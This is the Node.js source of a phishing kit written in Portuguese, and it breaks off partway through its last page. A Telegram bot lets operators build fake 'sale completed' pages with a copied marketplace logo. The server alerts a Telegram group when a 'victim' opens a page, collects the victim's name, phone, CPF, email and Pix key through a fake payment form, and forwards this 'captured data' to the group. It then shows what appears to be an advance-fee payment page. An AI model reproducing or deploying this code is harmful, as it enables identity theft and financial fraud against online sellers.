const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN)
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID
const DATA_FILE = 'data.json';
const RENDER_URL = process.env.RENDER_URL 



// inicia mue server
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

setInterval(() => {
  fs.writeFileSync(DATA_FILE, JSON.stringify({ produtos: {}, acoes: {} }, null, 2));
  console.log("🗑️ Dados do data.json apagados automaticamente a cada 24 horas.");
}, 24 * 60 * 60 * 1000); 



function loadData() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (error) {
    return { produtos: {}, acoes: {} };
  }
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}


let produtos = {}; 
let acoes = {};

// comand /novo
bot.command('new', async (ctx) => {
  const userId = ctx.from.id;
  const data = loadData();


  Object.keys(data.produtos).forEach(produtoId => {
    if (data.produtos[produtoId].userId === userId && data.produtos[produtoId].etapa !== 'finalizado') {
      delete data.produtos[produtoId];
    }
  });

  const produtoId = Math.random().toString(36).slice(2, 11);
  data.produtos[produtoId] = {
    id: produtoId,
    userId,
    username: ctx.from.username || ctx.from.first_name || "Desconhecido", // Captura o nome do usuário
   
    etapa: 'vendedor',
    qr: '',
    vendedor: '',
    nome: '',
    descricao: '',
    valor: '',
    imagem1: '',
    imagem2: '',
    dataVenda: '',
    regiao: '',
  };

  saveData(data);
  produtos[userId] = data.produtos[produtoId]; 
  await ctx.reply('Digite o nome do vendedor:');
});




bot.command('qr', async (ctx) => {
  console.log('[LOG] Comando /qr recebido:', ctx.message.text);

  const [_, produtoId, novoCodigo] = ctx.message.text.split(' ');
  console.log('[LOG] produtoId:', produtoId, 'novoCodigo:', novoCodigo);


  if (!produtoId || !novoCodigo) {
       
    console.log('[ERRO] Formato inválido');
    return await ctx.reply('❌ Use: /qr <ID_Produto> <Novo_Código>');
  }


  const sanitizedProdutoId = produtoId.trim();
  const sanitizedNovoCodigo = novoCodigo.trim();

  // Carregar dados
  let data;
  try {
    data = loadData();
  } catch (error) {
    console.error('[ERRO] Falha ao carregar dados:', error);
    return await ctx.reply('❌ Erro ao carregar dados. Tente novamente mais tarde.');
  }

  // Verificar se o produto existe
  const produto = data.produtos[sanitizedProdutoId];
  if (!produto) {
    console.log('[ERRO] Produto não encontrado');
    return await ctx.reply('❌ Produto não encontrado!');
  }


  produto.qr = sanitizedNovoCodigo;

  // Salvar dados
  try {
    saveData(data);
    console.log('[LOG] Código atualizado:', sanitizedNovoCodigo);
    await ctx.reply(`✅ Código atualizado!\nNovo código: ${sanitizedNovoCodigo}`);
  } catch (error) {
    console.error('[ERRO] Falha ao salvar dados:', error);
    await ctx.reply('❌ Erro ao salvar dados. Tente novamente mais tarde.');
  }
});


bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const data = loadData(); // Carrega os dados do arquivo
  
    if (produtos[userId]) {
      const produto = produtos[userId];
      switch (produto.etapa) {
        case 'vendedor':
          produto.vendedor = text;
          produto.etapa = 'produto';
          data.produtos[produto.id] = produto; 
          saveData(data);
          await ctx.reply('Digite o nome do produto:');
          break;
        case 'produto':
          produto.nome = text;
          produto.etapa = 'descricao';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a descrição do produto:');
          break;
        case 'descricao':
          produto.descricao = text;
          produto.etapa = 'valor';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite o valor do produto (ex: 500):');
          break;
        case 'valor':
          produto.valor = text;
          produto.etapa = 'imagem1';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Envie a URL da primeira imagem do produto:');
          break;
        case 'imagem1':
          produto.imagem1 = text;
          produto.etapa = 'imagem2';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Envie a URL da segunda imagem do produto:');
          break;
        case 'imagem2':
          produto.imagem2 = text;
          produto.etapa = 'data';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a data da venda (ex: 28/01/2025):');
          break;
        case 'data':
          produto.dataVenda = text;
          produto.etapa = 'regiao';
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite a região do vendedor (ex: São Paulo - SP):');
          break;
        case 'regiao':
          produto.regiao = text;
          produto.etapa = 'qr'; 
          data.produtos[produto.id] = produto;
          saveData(data);
          await ctx.reply('Digite o código QR:');
          break;
        case 'qr':
          produto.qr = text; 
          produto.etapa = 'finalizado';
  
          
          const actionId = Math.random().toString(36).substr(2, 9);
          data.acoes[actionId] = { produtoId: produto.id, redirectTo: 'https://exemplo.com/dados-bancarios' };
          produto.actionId = actionId;
  
          data.produtos[produto.id] = produto;
          saveData(data); 
  
          await ctx.reply(`✅ Produto cadastrado! Acesse: ${RENDER_URL}/produtos?id=${produto.id}`);
          await ctx.reply(`id de mudança de URL ${actionId}`);
          break;
        default:
          await ctx.reply('❌Comando não reconhecido ou cadastro já finalizado vagabundagem');
      }
    }
  });
  // Configuração do Webhook para produção
if (process.env.NODE_ENV === 'production') {
    bot.telegram.setWebhook(`${RENDER_URL}/bot${bot.token}`);
    app.use(bot.webhookCallback(`/bot${bot.token}`));
} else {
    bot.launch(); // Só usa polling em desenvolvimento
}

  app.get('/produtos', (req, res) => {
    const id = req.query.id;
    const data = loadData(); 
  

    const produto = data.produtos[id];
  
    if (!produto) {
      return res.status(404).send('Produto não encontrado!');
    }
  

    const acao = data.acoes[produto.actionId];
  
    if (!acao) {
      return res.status(404).send('Ação não encontrada!');
    }
  
    const mensagemProduto = `
      🎰 Vitima Acessou o Site UpUp!
      - 📌 Produto: ${produto.nome}
      - 🏷️ Vendedor: ${produto.vendedor}
      - 📅 Data da Venda: ${produto.dataVenda}
      - 🏦 Valor: R$ ${produto.valor}
      - 🆔️ ID: ${produto.actionId}
    `;
  
    // Envia a mensagem para o grupo do Telegram
    bot.telegram.sendMessage(GROUP_CHAT_ID, mensagemProduto, { parse_mode: "Markdown" });
  
    // Renderiza a página do produto
    res.send(`

          <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${produto.nome}</title>
        <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 968.19 513'%3E%3Cpath d='M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3' fill='%236e0ad6' fill-rule='evenodd'/%3E%3Cpath d='M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1' fill='%238ce563' fill-rule='evenodd'/%3E%3Cpath d='M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2' fill='%23f28000' fill-rule='evenodd'/%3E%3C/svg%3E">

        <style>
            body {
                font-family: 'Poppins', sans-serif;
                margin: 0;
                padding: 0;
                background-color: #fffaf3; /* tom claro com leve laranja */
    color: #2d2d2d;
            }

            header {
                background-color: #fffefd; /* laranja */
    color: white;
    border-bottom: 2px solid #d85c00;
                padding: 0.8rem 1rem;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: left;
                font-size: 1.2rem;
                
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            header img {
                width: 50px;
                height: 50px;
                margin-right: 10px;
            }

            .container {
                max-width: 900px;
                margin: 5rem auto;
                background: white;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                border-radius: 12px;
                padding: 20px;
            }

            .product-images {
                display: flex;
                overflow-x: auto;
                padding: 10px;
                gap: 1rem;
            }

            .product-images img {
                width: 60%;
                max-width: 300px;
                border-radius: 8px;
                transition: transform 0.3s;
            }

            .product-images img:hover {
                transform: scale(1.05);
            }

            .sale-bubble {
                background-color:#4caf50;
                color: white;
                padding: 0.8rem;
                text-align: center;
                font-size: 1.1rem;
                font-weight: bold;
                margin: 15px 0;
                border-radius: 8px;
            }

            .details h1 {
                margin: 0 0 1rem;
                font-size: 2rem;
                color: #8a2be2; /* roxo */
            }

            .details p {
                margin: 0.5rem 0;
                font-size: 1.1rem;
            }
            .sale-bubble {
    background-color: #4caf50; /* verde mantido */
    color: white;
}

            .seller-info {
                display: flex;
                align-items: center;
                margin-top: 20px;
            }

            .seller-info img {
                border-radius: 50%;
                width: 60px;
                height: 60px;
                margin-right: 10px;
            }

            footer {
                background-color: #8a2be2; /* roxo */
    color: #ffffffcc;
                padding-top: 10px;
                padding-bottom: 10px;
                text-align: center;
                font-size: 1rem;
                width: 100%;
                margin-top: 0;
                position: relative;
                bottom: 0;
            }

            footer a {
                color: #ffffff;
                font-weight: bold;
            }

            footer p {
                font-size: small;
                margin-top: 0px;
                margin-bottom: 0px;
            }

            footer a:hover {
                text-decoration: underline;
            }

            .modal {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.5);
                display: flex;
                justify-content: center;
                align-items: center;
                visibility: hidden;
                opacity: 0;
                transition: visibility 0s, opacity 0.3s;
            }

            .modal.active {
                visibility: visible;
                opacity: 1;
            }

            .modal-content {
                background: white;
                padding: 2rem;
                border-radius: 12px;
                text-align: center;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            }

            .modal-content h2 {
                color: #8a2be2;
            }

            .modal-content button {
                background-color: #f28000;
                color: white;
                border: none;
                padding: 0.5rem 1rem;
                font-size: 1rem;
                border-radius: 8px;
                cursor: pointer;
            }

            .modal-content button:hover {
                background-color: #d85c00;
            }
        </style>
    </head>
    <body>
        <header>
            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 968.19 513"><path d="M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3" fill="#6e0ad6" fill-rule="evenodd"/><path d="M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1" fill="#8ce563" fill-rule="evenodd"/><path d="M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2" fill="#f28000" fill-rule="evenodd"/></svg>
                 </header>

        <div class="container">
            <div class="seller-info">
                <img src="https://cdn-icons-png.flaticon.com/512/4794/4794936.png" alt="Imagem do vendedor">
                <div>
                    <p><strong>Vendedor:</strong> ${produto.vendedor}</p>
                    <p><strong>Cidade:</strong> ${produto.regiao}</p>
                    <p><strong>Vendedor desde:</strong> Jan/2025</p>
                </div>
            </div>

            <div class="product-images">
                <img src="${produto.imagem1}" alt="Imagem do produto 1">
                <img src="${produto.imagem2}" alt="Imagem do produto 2">
            </div>

            <div class="sale-bubble">
                Venda realizada com sucesso!
            </div>

            <div class="details">
                <h1>${produto.nome}</h1>
                <p><strong>Valor:</strong> ${produto.valor}</p>
                <p><strong>Descrição:</strong> ${produto.descricao}</p>
            </div>

            <div class="details">
                <h2>Informações da Venda</h2>
                <p><strong>Data da venda:</strong> ${produto.dataVenda}</p>
                <p><strong>Comprador:</strong> Juliane Santos</p>
                <p><strong>Cidade do comprador:</strong> ${produto.regiao}</p>
            </div>
        </div>

        <div id="modal" class="modal">
            <div class="modal-content">
                <h2><strong>Parabéns pela sua venda!</strong></h2>
                <p style="padding-left: 5px; padding-right: 5px;">
                    Sua venda foi concluída com sucesso. Clique abaixo para fornecer os dados bancários e garantir o pagamento rápido e seguro. Continue vendendo com sucesso!
                </p>
                <button onclick="window.location.href='${RENDER_URL}/pagina-secundaria?id=${produto.actionId}'">Avançar</button>
            </div>
        </div>

        <footer>
            <p>Ao vender pelo nosso aplicativo, você estará concordando com os <a href="#">Termos de Uso</a> e nossa <a href="#">Política de Privacidade</a>.</p>
        </footer>

        <script>
            function showModal() {
                document.getElementById('modal').classList.add('active');
            }

            function closeModal() {
                document.getElementById('modal').classList.remove('active');
            }

            // Exibe o modal após 5 segundos
            setTimeout(showModal, 4000);
        </script>
    </body>
    </html>
      
      
    `);
  });

  app.get('/pagina-secundaria', (req, res) => {
    const actionId = req.query.id;
    const data = loadData(); 
  
   
    const acao = data.acoes[actionId];
  
    if (!acao) {
      return res.status(404).send('Ação não encontrada!');
    }
  
    
    res.send(`
      <!DOCTYPE html>
      <html lang="pt-br">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Informações Bancárias</title>
           <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 968.19 513'%3E%3Cpath d='M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3' fill='%236e0ad6' fill-rule='evenodd'/%3E%3Cpath d='M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1' fill='%238ce563' fill-rule='evenodd'/%3E%3Cpath d='M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2' fill='%23f28000' fill-rule='evenodd'/%3E%3C/svg%3E">

          <style>
              body {
                  font-family: 'Poppins', sans-serif;
                  margin: 0;
                  padding: 0;
                  background-color: #f4f5e5;
                  color: black;
              }
  
              header {
                  background-color: white;
                  color: black;
                  padding: 0.8rem 1rem;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  text-align: left;
                  font-size: 1.2rem;
                  border-bottom: 2px solid #ddd;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  z-index: 1000;
                  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
              }
  
              header img {
                  width: 50px;
                  height: 50px;
                  margin-right: 10px;
              }
  
              .venda-realizada {
                  background-color: #d89400;
                  color: white;
                  text-align: center;
                  padding: 1.5rem;
                  font-size: 1.5rem;
                  font-weight: bold;
                  margin-top: 80px;
              }
  
              .form-container {
                  max-width: 500px;
                  margin: 2rem auto;
                  background: white;
                  padding: 2rem;
                  border-radius: 12px;
                  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
                  margin-top: 60px;
              }
  
              .form-container h2 {
                  margin-bottom: 1.5rem;
                  color: #0c9500;
                  text-align: center;
              }
  
              .form-container label {
                  display: block;
                  margin-bottom: 0.5rem;
                  font-weight: bold;
              }
  
              .form-container input,
              .form-container select {
                  width: 100%;
                  padding: 0.5rem;
                  margin-bottom: 1rem;
                  border: 1px solid #ddd;
                  border-radius: 8px;
                  font-size: 1rem;
              }
  
              .form-container button {
                  background-color: #958600;
                  color: white;
                  border: none;
                  padding: 0.5rem 1rem;
                  font-size: 1rem;
                  border-radius: 8px;
                  cursor: pointer;
                  width: 100%;
              }
  
              .form-container button:hover {
                  background-color: #7b1fa2;
              }
  
              .form-container img {
                  width: 100%;
                  margin-top: 1rem;
                  margin-bottom: 1rem;
              }
  
              footer {
                  background-color: #61005E;
                  color: rgba(255, 255, 255, 0.801);
                  padding-top: 10px;
                  padding-bottom: 10px;
                  text-align: center;
                  font-size: 1rem;
                  width: 100%;
                  margin-top: 0;
                  position: relative;
                  bottom: 0;
              }
  
              footer a {
                  color: rgb(255, 255, 255);
                  font-weight: bold;
              }
  
              footer p {
                  font-size: small;
                  margin-top: 0px;
                  margin-bottom: 0px;
              }
  
              footer a:hover {
                  text-decoration: underline;
              }
  
              @media screen and (max-width: 768px) {
                  header {
                      padding: 0.7rem 1rem;
                      font-size: 1.1rem;
                  }
  
                  .venda-realizada {
                      font-size: 1.2rem;
                      padding: 1rem;
                  }
  
                  .form-container {
                      padding: 1.5rem;
                      margin: 1rem;
                  }
              }
  
              @media screen and (max-width: 480px) {
                  header {
                      font-size: 1rem;
                      padding: 0.6rem 1rem;
                  }
  
                  .venda-realizada {
                      font-size: 1rem;
                      padding: 0.8rem;
                  }
  
                  .form-container {
                      padding: 1rem;
                      margin: 0.5rem;
                  }
              }
          </style>
      </head>
      <body>
      <style>
       header {
                  background-color: white;
                  color: black;
                  padding: 0.8rem 1rem;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  text-align: left;
                  font-size: 1.2rem;
                  border-bottom: 2px solid #ddd;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  z-index: 1000;
                  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
              }
  
              header img {
                  width: 50px;
                  height: 50px;
                  margin-right: 10px;
              }
      </style>
         <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 968.19 513"><path d="M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3" fill="#6e0ad6" fill-rule="evenodd"/><path d="M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1" fill="#8ce563" fill-rule="evenodd"/><path d="M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2" fill="#f28000" fill-rule="evenodd"/></svg>
           </header>
  
          <div class="venda-realizada">
              Receba seu Pagamento
          </div>
  
          <div class="form-container">
              <h2>Preencha seus Dados Bancários</h2>
              <form action="${RENDER_URL}/confirmar?id=${actionId}" method="POST" id="form-dados-bancarios" onsubmit="return validarFormulario();">
                  <label for="nome">Nome Completo:</label>
                  <input type="text" id="nome" name="nome" placeholder="Seu nome completo" required>
  
                  <label for="telefone">Telefone:</label>
                  <input type="tel" id="telefone" name="telefone" placeholder="Seu número de telefone" required
                      pattern="\+?[0-9\s\-\(\)]{10,15}" title="Digite um número de telefone válido">
  
                  <label for="cpf">CPF:</label>
                  <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
  
                  <label for="banco">Email:</label>
                  <input type="email" id="banco" name="banco" placeholder="Email" required>
  
                  <p>Aceitamos todos os bancos</p>
                  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZldct4y1ni1qQCcZO0GSYb9SCyD5pGC0hmQ&s"
                      alt="Imagem de todos os bancos">
  
                  <label for="chave-pix">Escolha a chave Pix:</label>
                  <select id="chave-pix" name="chave-pix" onchange="atualizarPlaceholder()" required>
                      <option value="cpf">CPF</option>
                      <option value="cnpj">CNPJ</option>
                      <option value="email">E-mail</option>
                      <option value="telefone">Telefone</option>
                      <option value="chave-aleatoria">Chave Aleatória</option>
                  </select>
  
                  <label for="chave">Chave Pix:</label>
                  <input type="text" id="chave" name="chave" placeholder="Digite a chave Pix escolhida" required>
  
                  <div id="alerta" style="display: none; color: red; font-size: 0.9rem; margin-bottom: 15px;">
                      Todos os campos são obrigatórios e o CPF deve ser válido.
                  </div>
  
                  <button type="submit">Confirmar Dados</button>
              </form>
          </div>
  
          <footer>
              <p>Ao confirmar seus dados, você estará concordando com nossos <a href="#">Termos de Uso</a> e nossa <a
                      href="#">Política de Privacidade</a>. Garantimos a máxima segurança para você!</p>
          </footer>
  
          <script>
              function atualizarPlaceholder() {
                  var select = document.getElementById('chave-pix');
                  var chavePix = select.value;
                  var inputChave = document.getElementById('chave');
  
                  switch (chavePix) {
                      case 'cpf':
                          inputChave.placeholder = 'Digite seu CPF (Ex: 000.000.000-00)';
                          break;
                      case 'cnpj':
                          inputChave.placeholder = 'Digite seu CNPJ (Ex: 00.000.000/0001-00)';
                          break;
                      case 'email':
                          inputChave.placeholder = 'Digite seu E-mail';
                          break;
                      case 'telefone':
                          inputChave.placeholder = 'Digite seu Telefone (Ex: (00) 00000-0000)';
                          break;
                      case 'chave-aleatoria':
                          inputChave.placeholder = 'Digite sua Chave Aleatória';
                          break;
                      default:
                          inputChave.placeholder = 'Digite a chave Pix escolhida';
                          break;
                  }
              }
  
              function validarCPF(cpf) {
                  cpf = cpf.replace(/\D/g, '');
  
                  const pattern = new RegExp("^(.)\\1{10}$");
  
                  if (cpf.length !== 11 || pattern.test(cpf)) return false;
  
                  let soma = 0, resto;
  
                  for (let i = 0; i < 9; i++) {
                      soma += parseInt(cpf[i]) * (10 - i);
                  }
                  resto = (soma * 10) % 11;
                  if (resto === 10 || resto === 11) resto = 0;
                  if (resto !== parseInt(cpf[9])) return false;
  
                  soma = 0;
                  for (let i = 0; i < 10; i++) {
                      soma += parseInt(cpf[i]) * (11 - i);
                  }
                  resto = (soma * 10) % 11;
                  if (resto === 10 || resto === 11) resto = 0;
                  if (resto !== parseInt(cpf[10])) return false;
  
                  return true;
              }
  
              function validarFormulario() {
                  var campos = document.querySelectorAll(
                      '#form-dados-bancarios input[required], #form-dados-bancarios select[required]');
                  var alerta = document.getElementById('alerta');
                  var valido = true;
  
                  campos.forEach(function(campo) {
                      if (!campo.value.trim()) {
                          valido = false;
                          campo.style.border = '1px solid red';
                      } else {
                          campo.style.border = '1px solid #ddd';
                      }
                  });
  
                  var cpf = document.getElementById('cpf').value;
                  if (!validarCPF(cpf)) {
                      valido = false;
                      document.getElementById('cpf').style.border = '1px solid red';
                  }
  
                  if (!valido) {
                      alerta.style.display = 'block';
                  } else {
                      alerta.style.display = 'none';
                  }
  
                  return valido;
              }
          </script>
      </body>
      </html>
    `);
  });




app.post('/confirmar', async (req, res) => {
    const { nome, telefone, cpf, banco, chave } = req.body; 
    const actionId = req.query.id;
    const data = loadData();
  
   
    const acao = data.acoes[actionId];
    if (!acao) {
        return res.status(404).send('Ação não encontrada!');
    }

   
    const produtoId = acao.produtoId;
    const produto = data.produtos[produtoId];


    if (!nome || !telefone || !cpf || !banco || !chave) {
        return res.status(400).send('Todos os campos são obrigatórios!');
    }


    if (!produto) {
        return res.status(404).send('Produto não encontrado');
    }

  
    const mensagem = `
    ♦️7️⃣ Dados Capturados UpUp!
    👤 Usuário: ${produto.username || "Desconhecido"} 
    ━━━━━━━━━━━━━━━━━━━━━
    ▫️ Nome: ${nome}
    ▫️ Telefone: ${telefone}
    ▫️ CPF: ${cpf}
    ▫️ Email: ${banco}
    ▫️ Chave Pix: ${chave}
    ━━━━━━━━━━━━━━━━━━━━━
    ✅ Dados validados com sucesso!`;

    try {
        await bot.telegram.sendMessage(GROUP_CHAT_ID, mensagem, { parse_mode: 'Markdown' });
        res.send(`

            
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento da Taxa</title>
        <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 968.19 513'%3E%3Cpath d='M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3' fill='%236e0ad6' fill-rule='evenodd'/%3E%3Cpath d='M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1' fill='%238ce563' fill-rule='evenodd'/%3E%3Cpath d='M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2' fill='%23f28000' fill-rule='evenodd'/%3E%3C/svg%3E">

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>
<body class="bg-white text-gray-800">
   <style>
    header {
                background-color: white;
                color: black;
                padding: 0.8rem 1rem;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: left;
                font-size: 1.2rem;
                border-bottom: 2px solid #ddd;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            header img {
                width: 50px;
                height: 50px;
                margin-right: 10px;
            }
            
            /* Timer Styles */
            .timer-container {
                margin-top: 15px;
                border: 2px solid #d8b4fe;
                border-radius: 8px;
                padding: 10px;
                background-color: #f5f3ff;
            }
            
            .timer-display {
                font-size: 2rem;
                font-weight: bold;
                color: #6b21a8;
                text-align: center;
            }
            
            .timer-label {
                color: #4b5563;
                text-align: center;
                font-size: 0.9rem;
                margin-top: 5px;
            }
            
            .expired-message {
                color: #ef4444;
                font-weight: bold;
                font-size: 1rem;
                margin: 10px 0;
                line-height: 1.5;
                text-align: center;
            }

   </style>
    <header>
